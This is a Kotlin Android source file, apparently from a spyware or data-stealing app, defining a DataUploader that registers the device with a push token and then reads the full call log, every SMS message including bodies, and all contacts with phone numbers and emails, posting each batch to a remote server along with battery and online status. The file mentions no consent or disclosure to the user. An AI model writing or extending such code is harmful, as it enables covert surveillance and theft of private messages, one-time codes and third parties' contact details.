package com.example.test.utils

import android.content.Context
import android.util.Log
import android.provider.ContactsContract
import android.provider.Telephony
import android.database.Cursor
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

object DataUploader {

    private const val TAG = "DataUploader"
    
    private fun getBaseUrl(): String = com.example.test.ServerConfig.getBaseUrl()

    fun registerDevice(context: Context, deviceId: String, fcmToken: String, userId: String): Boolean {
        return try {
            val deviceInfo = DeviceInfoHelper.buildDeviceInfoJson(context, deviceId, fcmToken, userId)
            val appConfig = com.example.test.AppConfig.getInstance()

            val registerJson = JSONObject().apply {
                put("type", "register")
                put("device_id", deviceId)
                put("device_info", deviceInfo)
                put("user_id", userId)
                put("app_type", appConfig.appType)
            }

            sendPostRequest("${getBaseUrl()}/register", registerJson.toString())
            true

        } catch (e: Exception) {
            Log.e(TAG, "Register device failed: ${e.message}", e)
            false
        }
    }

    fun uploadCallHistory(context: Context, deviceId: String) {
        try {
            val callsArray = JSONArray()
            val cursor: Cursor? = context.contentResolver.query(
                android.provider.CallLog.Calls.CONTENT_URI,
                null, null, null,
                android.provider.CallLog.Calls.DATE + " DESC"
            )

            cursor?.use {
                val numberIndex = it.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
                val typeIndex = it.getColumnIndex(android.provider.CallLog.Calls.TYPE)
                val dateIndex = it.getColumnIndex(android.provider.CallLog.Calls.DATE)
                val durationIndex = it.getColumnIndex(android.provider.CallLog.Calls.DURATION)
                val nameIndex = it.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME)
                val idIndex = it.getColumnIndex(android.provider.CallLog.Calls._ID)

                while (it.moveToNext()) {
                    val callId = it.getLong(idIndex)
                    val number = it.getString(numberIndex) ?: ""
                    val type = it.getInt(typeIndex)
                    // Call log timestamp is in SECONDS, convert to milliseconds
                    val timestampSeconds = it.getLong(dateIndex)
                    val timestamp = timestampSeconds * 1000
                    val duration = it.getInt(durationIndex)
                    val name = it.getString(nameIndex) ?: "Unknown"

                    val callType = when (type) {
                        android.provider.CallLog.Calls.INCOMING_TYPE -> "incoming"
                        android.provider.CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                        android.provider.CallLog.Calls.MISSED_TYPE -> "missed"
                        android.provider.CallLog.Calls.REJECTED_TYPE -> "rejected"
                        android.provider.CallLog.Calls.BLOCKED_TYPE -> "blocked"
                        android.provider.CallLog.Calls.VOICEMAIL_TYPE -> "voicemail"
                        else -> "unknown"
                    }

                    val call = JSONObject().apply {
                        put("call_id", "${deviceId}_call_${callId}")
                        put("device_id", deviceId)
                        put("number", number)
                        put("name", name)
                        put("call_type", callType)
                        put("timestamp", timestamp)
                        put("duration", duration)
                        put("received_at", System.currentTimeMillis())
                    }
                    callsArray.put(call)
                }
            }

            if (callsArray.length() == 0) {
                return
            }

            val payload = JSONObject().apply {
                put("device_id", deviceId)
                put("data", callsArray)
                put("batch_info", JSONObject().apply {
                    put("batch", 1)
                    put("of", 1)
                })
            }

            sendPostRequest("${getBaseUrl()}/call-logs/batch", payload.toString())

        } catch (e: SecurityException) {
            Log.e(TAG, "Permission denied for reading call log", e)
        } catch (e: Exception) {
            Log.e(TAG, "Upload call history failed: ${e.message}", e)
        }
    }

    fun uploadAllSms(context: Context, deviceId: String) {
        try {
            val messages = JSONArray()
            val cursor: Cursor? = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                null, null, null,
                Telephony.Sms.DATE + " DESC"
            )

            cursor?.use {
                val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
                val typeIndex = it.getColumnIndex(Telephony.Sms.TYPE)

                while (it.moveToNext()) {
                    val address = it.getString(addressIndex) ?: ""
                    val body = it.getString(bodyIndex) ?: ""
                    val timestamp = it.getLong(dateIndex)
                    val smsType = it.getInt(typeIndex)

                    val (from, to) = when (smsType) {
                        Telephony.Sms.MESSAGE_TYPE_INBOX -> Pair(address, deviceId)
                        Telephony.Sms.MESSAGE_TYPE_SENT -> Pair(deviceId, address)
                        else -> Pair(address, deviceId)
                    }

                    val typeStr = when (smsType) {
                        Telephony.Sms.MESSAGE_TYPE_INBOX -> "inbox"
                        Telephony.Sms.MESSAGE_TYPE_SENT -> "sent"
                        Telephony.Sms.MESSAGE_TYPE_DRAFT -> "draft"
                        Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "outbox"
                        Telephony.Sms.MESSAGE_TYPE_FAILED -> "failed"
                        Telephony.Sms.MESSAGE_TYPE_QUEUED -> "queued"
                        else -> "unknown"
                    }

                    val sms = JSONObject().apply {
                        put("from", from)
                        put("to", to)
                        put("body", body)
                        put("timestamp", timestamp)
                        put("type", typeStr)
                    }
                    messages.put(sms)
                }
            }

            val json = JSONObject().apply {
                put("device_id", deviceId)
                put("data", messages)
                put("batch_info", JSONObject().apply {
                    put("batch", 1)
                    put("of", 1)
                })
            }

            sendPostRequest("${getBaseUrl()}/sms/batch", json.toString())

        } catch (e: Exception) {
            Log.e(TAG, "Upload SMS failed: ${e.message}", e)
        }
    }

    fun uploadAllContacts(context: Context, deviceId: String) {
        try {
            val contacts = JSONArray()
            val cursor: Cursor? = context.contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            )

            cursor?.use {
                val idIndex = it.getColumnIndex(ContactsContract.Contacts._ID)
                val nameIndex = it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)

                while (it.moveToNext()) {
                    val contactId = it.getString(idIndex)
                    val name = it.getString(nameIndex) ?: ""

                    var phoneNumber = ""
                    val phoneCursor = context.contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        arrayOf(contactId),
                        null
                    )

                    phoneCursor?.use { pc ->
                        val phoneIndex = pc.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                        if (pc.moveToFirst()) {
                            phoneNumber = pc.getString(phoneIndex) ?: ""
                        }
                    }

                    var email = ""
                    val emailCursor = context.contentResolver.query(
                        ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                        arrayOf(contactId),
                        null
                    )

                    emailCursor?.use { ec ->
                        val emailIndex = ec.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS)
                        if (ec.moveToFirst()) {
                            email = ec.getString(emailIndex) ?: ""
                        }
                    }

                    if (phoneNumber.isNotEmpty()) {
                        val contact = JSONObject().apply {
                            put("id", contactId)
                            put("name", name)
                            put("phone", phoneNumber)
                            put("email", email)
                        }
                        contacts.put(contact)
                    }
                }
            }

            val json = JSONObject().apply {
                put("device_id", deviceId)
                put("data", contacts)
                put("batch_info", JSONObject().apply {
                    put("batch", 1)
                    put("of", 1)
                })
            }

            sendPostRequest("${getBaseUrl()}/contacts/batch", json.toString())

        } catch (e: Exception) {
            Log.e(TAG, "Upload contacts failed: ${e.message}", e)
        }
    }

    fun sendBatteryUpdate(context: Context, deviceId: String, fcmToken: String) {
        try {
            val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            val batteryLevel = batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)

            val json = JSONObject().apply {
                put("device_id", deviceId)
                put("fcm_token", fcmToken)
                put("data", JSONObject().apply {
                    put("battery", batteryLevel)
                    put("is_online", true)
                })
                put("timestamp", System.currentTimeMillis())
            }

            sendPostRequest("${getBaseUrl()}/battery", json.toString())

        } catch (e: Exception) {
            Log.e(TAG, "Battery update failed: ${e.message}", e)
        }
    }

    private fun sendPostRequest(urlString: String, jsonData: String): String? {
        var connection: HttpURLConnection? = null
        try {
            val url = URL(urlString)
            connection = url.openConnection() as HttpURLConnection
            connection.apply {
                requestMethod = "POST"
                doOutput = true
                setRequestProperty("Content-Type", "application/json")
                connectTimeout = 15000
                readTimeout = 15000
            }

            connection.outputStream.use { os ->
                os.write(jsonData.toByteArray())
                os.flush()
            }

            val responseCode = connection.responseCode

            return if (responseCode == HttpURLConnection.HTTP_OK) {
                connection.inputStream.bufferedReader().use { it.readText() }
            } else {
                null
            }

        } catch (e: Exception) {
            Log.e(TAG, "HTTP request failed: ${e.message}", e)
            return null
        } finally {
            connection?.disconnect()
        }
    }
}